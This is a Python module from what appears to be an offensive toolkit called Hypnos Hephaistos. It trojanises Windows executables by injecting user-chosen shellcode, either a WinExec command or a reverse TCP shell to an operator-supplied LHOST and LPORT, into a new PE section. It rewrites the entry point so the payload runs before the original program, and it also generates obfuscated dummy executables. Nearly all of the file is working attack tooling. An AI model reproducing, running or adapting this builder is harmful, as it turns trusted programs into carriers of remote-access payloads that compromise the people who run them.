import os
import sys
import platform
sys.path.insert(0, sys.path[0].replace("\\SRC\\Core\\Modules", ""))

from SRC.Libs import LibDebug
from SRC.Libs import LibObfuscator
from SRC.Libs import LibByteEditor
from SRC.Libs import LibPeAnnalyzer
from SRC.Libs import LibShellcode
from SRC.Libs import LibPeEditor

Color = LibDebug.COLORS()
Env = LibDebug.CheckEnv()
LibDebug.CheckHypnosReq()

def menu():
    outputfile = LibObfuscator.RandomizedString(7) + ".exe"

    print(
        Color.GREEN + "Welcome to " + Color.RED +
        "Hypnos Hephaistos Version__" + Color.RESET
    )
    print(
        "Do you want to " + Color.BLUE + "specify an executable" + Color.RESET + " to edit or did you want me to " + Color.BLUE + "generate one" + Color.RESET + " ? [" + Color.YELLOW + "edit" + Color.RESET + "/" + Color.YELLOW + "generate" + Color.RESET + "] or [" + Color.YELLOW + "e" + Color.RESET + "/" + Color.YELLOW + "g" + Color.RESET + "] : ", end=""
    )
    value = input()
    case = ["generate", "edit", "e", "g"]
    if value in case:
        if value == "generate" or value == "g":
            LibDebug.Log("WORK", "Generating executable..")
            try:
                ObfuscatedC = LibObfuscator.ObfuscateC(
                    LibObfuscator.GenerateC(50), 25)
                inputfile = LibObfuscator.Compile(ObfuscatedC)
                os.system("rm *.c")
                LibDebug.Log("SUCCESS", Color.GREEN + inputfile +
                             Color.RESET + " generated..")
            except:
                LibDebug.Log("ERROR", "Generation failed..")
        elif value == "edit" or value == "e":
            LibDebug.Log("WORK", "Generating executable..")
            value = input("Enter the file you want to exploit : ")
            LibDebug.CheckFile(value)
            inputfile = value
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()

    HexContent = LibByteEditor.GetHexFromFile(inputfile)
    PeInput = LibPeAnnalyzer.Extract(HexContent)

    if PeInput.Optionalpeheader.signature == "020b":
            print(Color.RED + "!!" + Color.RESET + "Your file is a " + Color.YELLOW + "X64" + Color.RESET + " beware to pick a " + Color.YELLOW + "X64" + Color.RESET + " shellcode " + Color.RED + "!!")
    elif PeInput.Optionalpeheader.signature == "010b":
            print(Color.RED + "!!" + Color.RESET + "Your file is a " + Color.YELLOW + "X32" + Color.RESET + " beware to pick a " + Color.YELLOW + "X32" + Color.RESET + " shellcode " + Color.RED + "!!")

    print(
        Color.GREEN + "It's time to generate a " + Color.RED + "shellcode" + Color.RESET + "." +
        "\nHere's a list of options :"
    )

    shellcodes = []
    for (dirpath, _, filenames) in os.walk("SHELLCODES"):
        for file in filenames:
            shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])

    case = []
    for i in range(0, len(shellcodes)):
        case += str(i)
        print("     " + Color.GREEN + str(i) + Color.RESET + " - " + shellcodes[i].replace("SHELLCODES/",""))

    value = input("Select one shellcode : ")
    shellcode = LibShellcode.SHELLCODE()
    shellcode = LibShellcode.ReadSHELLCODE(shellcodes[int(value)])
    if value in case:
        LibDebug.Log("SUCCESS", shellcodes[int(value)] + " successfuly loaded.")
        LibDebug.Log("WORK", "Generating the shellcode..")
        selection = shellcodes[int(value)].replace("SHELLCODES/","")
        try:
            if "x32_Custom_Dynamic_WinExec" in selection:
                print("Please enter your " + Color.YELLOW +
                " COMMAND " + Color.RESET + " : ", end="")
                CMD = input()
                shellcode = LibShellcode.EditWinexec(shellcode, CMD)
            elif "x32_Custom_Dynamic_ReverseTCP_Shell" in selection:
                print("Please enter your " + Color.YELLOW + " LHOST IP " + Color.RESET + " : ", end="")
                LHOST = input()
                print("Please enter your " + Color.YELLOW + " LPORT " + Color.RESET + " : ", end="")
                LPORT = input()
                shellcode = LibShellcode.EditCDRTSX32(shellcode, LHOST, LPORT)
        except:
            LibDebug.Log(
                "ERROR", "Something went wrong with the generation. Exiting.")
            exit()
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()

    #ANCIENNE GENERATION AVEC NASM
    # shellcodes = []
    # for (dirpath, _, filenames) in os.walk("ASM/ShellCodes"):
    #     for file in filenames:
    #         if "dev" not in dirpath.split("\\") :
    #             shellcodes.append((dirpath+"/"+file).replace("\\","/").replace("ASM/ShellCodes/", "").split(".")[0])

    # case = []
    # for i in range(0, len(shellcodes)):
    #     if shellcodes[i].split("/")[1] == Env.ARCH:
    #         case += str(i)
    #         print("     " + Color.GREEN + str(i) +
    #             Color.RESET + " - " + shellcodes[i])

    # value = input("Select one shellcode : ")
    # shellcode = LibShellcode.SHELLCODE()
    # if value in case:
    #     LibDebug.Log("SUCCESS", shellcodes[int(
    #         value)] + " successfuly loaded.")
    #     LibDebug.Log("WORK", "Generating the shellcode..")
    #     selection = shellcodes[int(value)].replace("Windows/" + Env.ARCH + "/","")
    #     try:
    #         if selection == "Custom_Dynamic_ReverseTCP_Shell":
    #             print("Please enter your " + Color.YELLOW +
    #                           " LHOST IP " + Color.RESET + " : ", end="")
    #             LHOST = input()
    #             print("Please enter your " + Color.YELLOW +
    #                           " LPORT " + Color.RESET + " : ", end="")
    #             LPORT = input()
    #             shellcode = LibShellcode.GenerateCDRTShell(LHOST, LPORT)
    #         elif selection == "Custom_Dynamic_ReverseTCP_Staged":
    #             shellcode = LibShellcode.GenerateCDRTS()
    #         elif selection == "Custom_Dynamic_ReverseTCP_Threaded_Shell":
    #             shellcode = LibShellcode.GenerateCDRTTShell()
    #         elif selection == "Custom_Dynamic_WinExec":
    #             print("Please enter your " + Color.YELLOW +
    #                         " COMMAND " + Color.RESET + " : ", end="")
    #             CMD = input()
    #             shellcode = LibShellcode.GenerateWinExec(CMD)
    #     except:
    #         LibDebug.Log(
    #             "ERROR", "Something went wrong with the generation. Exiting.")
    #         exit()
    # else:
    #     LibDebug.Log("ERROR", "Bad entry. Exiting.")
    #     exit()

    newjump = str(hex(int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.addressofentrypoint), 16)
                      + int(LibByteEditor.RevertBytes(PeInput.Optionalpeheader.imagebase), 16)))[2:]
    shellcode = shellcode.GetShellcode()

    shellcode += "B8" + newjump + "FFE0"
    LibDebug.Log("SUCCESS", "Shellcode successfully generated.")

    LibDebug.Log("WORK", "Generating new section..")
    LibPeEditor.AddSection(PeInput, ".mew", shellcode)
    LibDebug.Log("WORK", "Calculating new EntryPoint..")
    LibPeEditor.ModifyEntryPoint(PeInput, PeInput.SectionTable.sections[int(
        PeInput.Coffheader.numberofsections, 16)-1].virtualaddress)

    LibDebug.Log("WORK", "Generating edited executable..")
    LibByteEditor.CreateExeFromPe(outputfile, PeInput)

    print("Did you want to verify the new executable ? [" + Color.YELLOW +
                  "y" + Color.RESET + "/" + Color.YELLOW + "n" + Color.RESET + "] : ", end="")
    value = input()
    case = ["y", "n"]
    if value in case:
        try:
            if value == "y":
                HexContent = LibByteEditor.GetHexFromFile(inputfile)
                PeInput = LibPeAnnalyzer.Extract(HexContent)
                HexContent = LibByteEditor.GetHexFromFile(outputfile)
                PeInput2 = LibPeAnnalyzer.Extract(HexContent)
                LibDebug.ComparePe(PeInput, PeInput2)
                LibDebug.Log("SUCCESS", "Your new file is " + Color.GREEN + outputfile + Color.RESET +".")
            elif value == "n":
                LibDebug.Log("SUCCESS", "Your new file is " + Color.GREEN + outputfile + Color.RESET +".")
        except:
            LibDebug.Log(
                "ERROR", "Something went wrong with the Verification. Exiting.")
            exit()
    else:
        LibDebug.Log("ERROR", "Bad entry. Exiting.")
        exit()


menu()
